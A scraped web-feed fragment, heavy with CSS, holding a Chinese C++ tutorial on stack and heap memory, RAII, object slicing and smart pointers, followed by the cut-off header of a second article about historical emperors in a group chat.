6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>以下知识和部分代码学习自<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLight-City%2FCPlusPlusThings%3Ftab%3Dreadme-ov-file" target="_blank" title="https://github.com/Light-City/CPlusPlusThings?tab=readme-ov-file" ref="nofollow noopener noreferrer">Light-City/CPlusPlusThings: C++那些事 (github.com)</a></p>
<h2 data-id="heading-0">栈</h2>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Obj</span>{
<span class="hljs-keyword">public</span>:
   <span class="hljs-built_in">Obj</span>()=<span class="hljs-keyword">default</span>;
   ~<span class="hljs-built_in">Obj</span>()=<span class="hljs-keyword">default</span>;
};
<span class="hljs-comment">//栈：自动管理内存</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">stack_example</span><span class="hljs-params">()</span>
</span>{
    Obj s; <span class="hljs-comment">//栈上创建对象</span>
    <span class="hljs-comment">//离开作用域后自动销毁</span>
}
</code></pre>
<h2 data-id="heading-1">堆</h2>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Obj</span>{
<span class="hljs-keyword">public</span>:
   <span class="hljs-built_in">Obj</span>()=<span class="hljs-keyword">default</span>;
   ~<span class="hljs-built_in">Obj</span>()=<span class="hljs-keyword">default</span>;
};
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heap_exmaple</span><span class="hljs-params">()</span>
</span>{
    Obj* s=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Obj</span>(); <span class="hljs-comment">//堆上创建对象</span>
    
    <span class="hljs-comment">//同时如果这里抛出异常，后面的delete不会执行</span>
    
    <span class="hljs-keyword">delete</span> s;<span class="hljs-comment">//需要手动删除</span>
}
</code></pre>
<p>从以上例子看出栈和堆的内存分配方式完全不同，栈会自动分配和释放，不会发生内存泄漏。而堆要求我们
手动管理，无论是忘记加delete,还是抛出异常，都会造成内存泄漏。</p>
<h2 data-id="heading-2">RALL:资源获取即初始化</h2>
<p>总的来说RALL即：</p>
<p>1，资源在构造函数中获得</p>
<p>2，资源在析构函数中释放</p>
<p>3，类的实例由堆栈控制</p>
<p>一下是代码演示：</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-comment">// RAII 资源获取即初始化,例1</span>

<span class="hljs-keyword">enum class</span> <span class="hljs-title class_">shape_type</span> {
    circle,
    triangle,
    rectangle,
};


<span class="hljs-keyword">class</span> <span class="hljs-title class_">shape</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">shape</span>() { cout &lt;&lt; <span class="hljs-string">"shape"</span> &lt;&lt; endl; }

    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>{
        cout &lt;&lt; <span class="hljs-string">"I am shape"</span> &lt;&lt; endl;
    }

    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">shape</span>() {}
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">circle</span> : <span class="hljs-keyword">public</span> shape {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">circle</span>() { cout &lt;&lt; <span class="hljs-string">"circle"</span> &lt;&lt; endl; }

    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>{
        cout &lt;&lt; <span class="hljs-string">"I am circle"</span> &lt;&lt; endl;
    }
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">triangle</span> : <span class="hljs-keyword">public</span> shape {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">triangle</span>() { cout &lt;&lt; <span class="hljs-string">"triangle"</span> &lt;&lt; endl; }

    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>{
        cout &lt;&lt; <span class="hljs-string">"I am triangle"</span> &lt;&lt; endl;
    }
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">rectangle</span> : <span class="hljs-keyword">public</span> shape {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">rectangle</span>() { cout &lt;&lt; <span class="hljs-string">"rectangle"</span> &lt;&lt; endl; }

    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>{
        cout &lt;&lt; <span class="hljs-string">"I am rectangle"</span> &lt;&lt; endl;
    }
};

<span class="hljs-function">shape *<span class="hljs-title">create_shape</span><span class="hljs-params">(shape_type type)</span> </span>{
    <span class="hljs-keyword">switch</span> (type) {
        <span class="hljs-keyword">case</span> shape_type::circle:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">circle</span>();
        <span class="hljs-keyword">case</span> shape_type::triangle:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">triangle</span>();
        <span class="hljs-keyword">case</span> shape_type::rectangle:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">rectangle</span>();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">shape_wrapper</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">shape_wrapper</span><span class="hljs-params">(shape *ptr = <span class="hljs-literal">nullptr</span>)</span> : ptr_(ptr) {</span>}

    ~<span class="hljs-built_in">shape_wrapper</span>() {
        <span class="hljs-keyword">delete</span> ptr_;
    }

    <span class="hljs-function">shape *<span class="hljs-title">get</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{
        <span class="hljs-keyword">return</span> ptr_;
    }

<span class="hljs-keyword">private</span>:
    shape *ptr_;
};


<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">shape_wrapper <span class="hljs-title">ptr</span><span class="hljs-params">(create_shape(shape_type::circle))</span></span>;
    ptr.<span class="hljs-built_in">get</span>()-&gt;<span class="hljs-built_in">print</span>();
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{

    <span class="hljs-comment">// 第一种方式</span>
    shape *sp = <span class="hljs-built_in">create_shape</span>(shape_type::circle);
    sp-&gt;<span class="hljs-built_in">print</span>();
    <span class="hljs-keyword">delete</span> sp;

    <span class="hljs-comment">// 第二种方式 RAII</span>
    <span class="hljs-built_in">foo</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-3">对象切片问题</h2>
<p>这个问题是我在刚接触c++时非常容易犯得错误，即把一个派生类对象直接赋值给一个基类对象。</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{

    circle object;
    shape sp = object;
    sp.<span class="hljs-built_in">print</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>此时结果如下：</p>
<pre><code class="hljs language-c++" lang="c++">shape
circle
I am shape
</code></pre>
<p>简单来说派生类“多出来”的部分被切掉了，只剩下基类部分。因此我们永远不要通过值传递将派生类传递给基类，而要使用指针和引用。</p>
<h2 data-id="heading-4">智能指针</h2>
<p>c++11后引入了智能指针，如unique_ptr,shared_ptr。使用智能指针不仅可以解决堆内存需要手动分配的问题和对象切片问题，还能使代码更加优雅简洁。所以请毫不犹豫使用智能指针。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷]]></title>    <link>https://juejin.cn/post/7589920318132862976</link>    <guid>https://juejin.cn/post/7589920318132862976</guid>    <pubDate>2026-01-01T08:55:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920318132862976" data-draft-id="7589918470789496866" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-01T08:55:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LucianaiB"/> <meta itemprop="url" content="https://juejin.cn/user/1269294586664749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1269294586664749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LucianaiB
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:55:50.000Z" title="Thu Jan 01 2026 08:55:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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